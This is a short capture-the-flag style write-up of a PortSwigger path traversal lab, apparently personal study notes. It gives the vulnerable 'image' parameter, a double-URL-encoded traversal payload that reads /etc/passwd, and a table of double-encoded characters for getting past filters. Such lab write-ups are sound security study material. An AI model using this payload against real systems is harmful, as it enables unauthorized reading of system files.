**Vulnerability:** path traversal vulnerability

**Vulnerable Parameter:** image (GET request)

**Impact:** List /etc/passwd contents

**Technique:** Directory Traversal Sequences with url encoding

**URL:** https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode
## Steps:
1. Find a vulnrebal parameter
2. Look for user-controlled input 
3. We find image parameter
4. Send request to burp suite
5. GET /image?filename=45.jpg
6. From the lab description we know the  application blocks  path traversal sequences and performs a URL-decode of the input before using it
7. %252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd 
8. Observe the response containing the /etc/passwd contents
9. Lab solved


## Notes:
- First thing you should look for is user-controlled input:
1. URL parameters : /download?file=report.pdf
2. POST parameters : filename=user1.txt

Character 	Encoded
. 	         %252e
/ 	         %252f
\ 	         %255c
- Those encoding took from PayloadsAllTheThings repo
- The app blocks ../ if u encode it once it will decode it again to ../ so double encode it
- %252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd payloads double decodes to ../../../etc/passwd






